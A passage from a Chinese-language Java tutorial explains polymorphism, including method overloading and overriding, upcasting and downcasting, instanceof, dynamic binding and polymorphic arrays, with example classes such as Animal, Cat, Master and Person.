<span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">A</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">A</span>();<br>        System.out.println(a.sum(<span class="hljs-number">10</span>,<span class="hljs-number">30</span>));<br>        System.out.println(a.sum(<span class="hljs-number">10</span>,<span class="hljs-number">30</span>,<span class="hljs-number">50</span>));<br><br>        <span class="hljs-comment">//方法重写提现多态</span><br>        <span class="hljs-type">B</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">B</span>();<br>        a.say();<br>        b.say();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">say</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;B say()方法被调用...&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">B</span>&#123; <span class="hljs-comment">//子类</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">(<span class="hljs-type">int</span> n1,<span class="hljs-type">int</span> n2)</span>&#123; <span class="hljs-comment">//和下面sum构成重载</span><br>        <span class="hljs-keyword">return</span> n1 + n2;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">(<span class="hljs-type">int</span> n1,<span class="hljs-type">int</span> n2,<span class="hljs-type">int</span> n3)</span>&#123;<br>        <span class="hljs-keyword">return</span> n1 + n2 + n3;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">say</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;A say() 方法被调用...&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2022-09-19%20%E4%B8%8B%E5%8D%8810.03.53.png" alt="截屏2022-09-19 下午10.03.53" style="zoom:50%;" /><h3 id="对象的多态"><a href="#对象的多态" class="headerlink" title="对象的多态"></a>对象的多态</h3><ol><li>一个对象的编译类型和运行类型可以不一致<ul><li>例如：Animal animal &#x3D; new Dog();   animal &#x3D; new Cat();【animal的编译类型是Animal，运行类型从Dog变成了Cat】</li></ul></li><li>编译类型在定义对象时，就确定了，不能改变</li><li>运行类型是可以变化的<ul><li>animal &#x3D; new Cat(); 【animal的运行类型变成了Cat，编译类型仍然是Animal】</li></ul></li><li>编译类型看定义时 &#x3D; 号的左边，运行类型看 &#x3D; 号的右边。</li></ol><p>案例：</p><p>主人让小猫吃鱼，小狗吃骨头。</p><p>Food类（父类，Animal与Food类似）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Food</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Food</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>小猫类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cat</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Animal</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Cat</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">super</span>(name);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>鱼类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Fish</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Food</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Fish</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">super</span>(name);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>小狗类和骨头类与小猫和鱼类似。</p><p>主人类（传统）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Master</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Master</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br>        <span class="hljs-comment">//主人给小狗 喂食 骨头</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">feed</span><span class="hljs-params">(Dog dog,Bone bone)</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;主人&quot;</span>+name+<span class="hljs-string">&quot;给&quot;</span>+dog.getName()+<span class="hljs-string">&quot;吃&quot;</span>+bone.getName());<br>    &#125;<br>    <span class="hljs-comment">//主人给小猫喂食鱼</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">feed</span><span class="hljs-params">(Cat cat,Fish fish)</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;主人&quot;</span>+name+<span class="hljs-string">&quot;给&quot;</span>+cat.getName()+<span class="hljs-string">&quot;吃&quot;</span>+fish.getName());<br>    &#125;<br>    <span class="hljs-comment">//如果动物很多，食物很多</span><br>    <span class="hljs-comment">//===&gt;feed 方法很多，不利于管理和维护</span><br>&#125;<br></code></pre></td></tr></table></figure><p>主人（多态版）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Master</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Master</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br>    <span class="hljs-comment">//animal编译类型是Animal，可以指向（接收）Animal子类的对象</span><br>    <span class="hljs-comment">//food 编译类型是Food,可以指向（接收）Food 子类的对象</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">feed</span><span class="hljs-params">(Animal animal,Food food)</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;主人&quot;</span>+name+<span class="hljs-string">&quot;给&quot;</span>+animal.getName()+<span class="hljs-string">&quot;吃&quot;</span>+food.getName());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Main:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Poly01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Master</span> <span class="hljs-variable">tom</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Master</span>(<span class="hljs-string">&quot;Tom&quot;</span>);<br>        <span class="hljs-type">Dog</span> <span class="hljs-variable">dog</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">&quot;yellow~&quot;</span>);<br>        <span class="hljs-type">Bone</span> <span class="hljs-variable">bone</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Bone</span>(<span class="hljs-string">&quot;big bone~&quot;</span>);<br>        tom.feed(dog,bone);<br>        <span class="hljs-type">Cat</span> <span class="hljs-variable">cat</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">&quot;Pat&quot;</span>);<br>        <span class="hljs-type">Fish</span> <span class="hljs-variable">fish</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Fish</span>(<span class="hljs-string">&quot;carp&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;=========&quot;</span>);<br>        tom.feed(cat,fish);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果：</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220919232739546.png" alt="image-20220919232739546" style="zoom:50%;" /><p>多态的前提：两个对象（类）存在继承关系。</p><h3 id="多态的向上转型"><a href="#多态的向上转型" class="headerlink" title="多态的向上转型"></a>多态的向上转型</h3><ol><li>向上转型：父类的引用指向了子类的对象</li><li>语法：父类类型引用名 &#x3D; new 子类类型();</li><li>特点：编译类型看左边，运行类型看右边<ul><li>可以调用父类中的所有成员（需遵守访问权限）</li><li>不能调用子类中的特有成员</li><li>最终运行效果看子类的具体实现</li></ul></li></ol><p>案例：</p><p>Animal.java(父类)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> &#123;<br>    String name=<span class="hljs-string">&quot;动物&quot;</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span><span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sleep</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;睡&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;跑&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;吃&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;hello,你好&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p> Cat.java(子类)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cat</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Animal</span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;猫吃鱼&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">catchMouse</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;猫抓老鼠&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Main:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PolyDetail</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//向上转型：父类的引用指向了子类的对象</span><br>        <span class="hljs-type">Animal</span> <span class="hljs-variable">animal</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>();<br><br>        <span class="hljs-comment">//不能调用子类的特有成员</span><br>        <span class="hljs-comment">//因为在编译阶段，能调用哪些成员，由编译类型来决定</span><br>        <span class="hljs-comment">//最终运行效果看子类的具体实现，即调用方法时，按照从子类(运行类型)开始查找方法</span><br>        animal.eat();<br>        animal.run();<br>        animal.show();<br>        animal.sleep();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220920001858632.png" alt="image-20220920001858632" style="zoom:50%;" /><h3 id="多态的向下转型"><a href="#多态的向下转型" class="headerlink" title="多态的向下转型"></a>多态的向下转型</h3><p>1）语法：子类类型 引用名 &#x3D; (子类类型)父类引用;</p><p>2）只能强转父类的引用，不能强转父类的对象</p><p>3）要求父类的引用必须指向的是当前目标的对象</p><p>4）可以调用子类类型中所有的成员</p><p>在向上转型的案例中添加向下转型：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Cat</span> <span class="hljs-variable">cat</span> <span class="hljs-operator">=</span> (Cat) animal;<br>cat.catchMouse();<br>System.out.println(<span class="hljs-string">&quot;ok&quot;</span>);<br></code></pre></td></tr></table></figure><img src="/Users/songyang/Library/Application Support/typora-user-images/image-20220925162450740.png" alt="image-20220925162450740" style="zoom:50%;" /><p>关于正确与否的判断：</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220925172712424.png" alt="image-20220925172712424" style="zoom:50%;" /><h3 id="属性无重写-amp-instantOf比较操作符"><a href="#属性无重写-amp-instantOf比较操作符" class="headerlink" title="属性无重写&amp;instantOf比较操作符"></a>属性无重写&amp;instantOf比较操作符</h3><p>属性没有重写一说。</p><p>例如:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Base</span>&#123;<br>  <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Sub</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Base</span>&#123;<br><span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">20</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>Base base &#x3D; new Sub();</p><p>base.count的输出看编译类型，也就是Base，输出为10.</p><p>instantOf比较操作符，用于判断对象的类型是否为xx类型或xx类型的子类型。</p><p>用法：A instanceof B</p><h3 id="练习-5"><a href="#练习-5" class="headerlink" title="练习"></a>练习</h3><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220926160314574.png" alt="image-20220926160314574" style="zoom:50%;" /><p>运行结果为？</p><p>分析：</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220926161249778.png" alt="image-20220926161249778" style="zoom:50%;" /><p>运行结果为：</p><p>20、10</p><p>True —— b和s指向同一个对象</p><p>10——属性无重写，Base 编译类型的count 是10 。</p><p>20——display方法重写，从子类开始找，所以输出为20.</p><p>属性看编译类型，方法看运行类型。</p><h3 id="java的动态绑定机制（重点）"><a href="#java的动态绑定机制（重点）" class="headerlink" title="java的动态绑定机制（重点）"></a>java的动态绑定机制（重点）</h3><p>下面的代码输出为？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.hspedu.poly_.dynamic_;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DynamicBinding</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">A</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">B</span>();<br>        System.out.println(a.sum());<br>        System.out.println(a.sum1());<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> getI()+<span class="hljs-number">10</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sum1</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> i+<span class="hljs-number">10</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getI</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> i;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">A</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">20</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> getI()+<span class="hljs-number">20</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sum1</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> i+<span class="hljs-number">10</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getI</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> i;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出为 40,30.</p><p>Q:如果将子类B中的sum方法注销，输出为？</p><p>A:输出为 30,30。因为产生了动态绑定机制，A中的getI()调用的是子类中的i。</p><p>Q:如果再将子类B中的sum1方法注销，输出为？</p><p>A:输出为30,20，因为属性i没有动态绑定机制。</p><p><strong>java的动态绑定机制：</strong></p><p>1.当调用对象方法的时候，<strong>该对象会和该对象的内存地址&#x2F;运行类型绑定</strong></p><p>2.当调用对象<strong>属性</strong>时，<strong>没有动态绑定机制</strong>，哪里声明，哪里使用</p><h3 id="多态应用1：多态数组"><a href="#多态应用1：多态数组" class="headerlink" title="多态应用1：多态数组"></a>多态应用1：多态数组</h3><p>数组的定义类型为父类类型，里面保存的实际元素为子类类型。</p><p>案例：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220926165028852.png" alt="image-20220926165028852"></p><p>Person类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><span class="hljs-comment">/* </span><br><span class="hljs-comment">此处省略构造器及setget</span><br><span class="hljs-comment">*/</span>    <br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">say</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> name + <span class="hljs-string">&#x27;\t&#x27;</span> + age;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Student及Teacher类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Person</span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> score;<br><br><span class="hljs-comment">/* </span><br><span class="hljs-comment">此处省略构造器及setget</span><br><span class="hljs-comment">*/</span>    <br>  <br>    <span class="hljs-comment">//重写父类say方法</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">say</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.say() + <span class="hljs-string">&quot; score:&quot;</span> + score;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Teacher</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Person</span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> salary;<br><br>   <span class="hljs-comment">/* </span><br><span class="hljs-comment">此处省略构造器及setget</span><br><span class="hljs-comment">*/</span>    <br>  <br>    <span class="hljs-comment">//重写父类say方法</span><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">say</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.say()+<span class="hljs-string">&quot; salary&quot;</span>+salary;<br>    &#125;<br></code></pre></td></tr></table></figure><p>主函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PolyArray</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-comment">//对象统一放在数组中(2个学生对象，2个老师对象)，并调用每个对象say方法。</span><br>        Person[] persons = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>[<span class="hljs-number">5</span>];<br>        persons[<span class="hljs-number">0</span>] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;jack&quot;</span>,<span class="hljs-number">20</span>);<br>        persons[<span class="hljs-number">1</span>] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;jack&quot;</span>,<span class="hljs-number">18</span>,<span class="hljs-number">100</span>);<br>        persons[<span class="hljs-number">2</span>] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;smith&quot;</span>,<span class="hljs-number">19</span>,<span class="hljs-number">30.1</span>);<br>        persons[<span class="hljs-number">3</span>] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Teacher</span>(<span class="hljs-string">&quot;scott&quot;</span>,<span class="hljs-number">30</span>,<span class="hljs-number">20000</span>);<br>        persons[<span class="hljs-number">4</span>] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Teacher</span>(<span class="hljs-string">&quot;king&quot;</span>,<span class="hljs-number">50</span>,<span class="hljs-number">25000</span>);<br>        <span class="hljs-comment">//循环遍历多态数组，调用say方法</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span 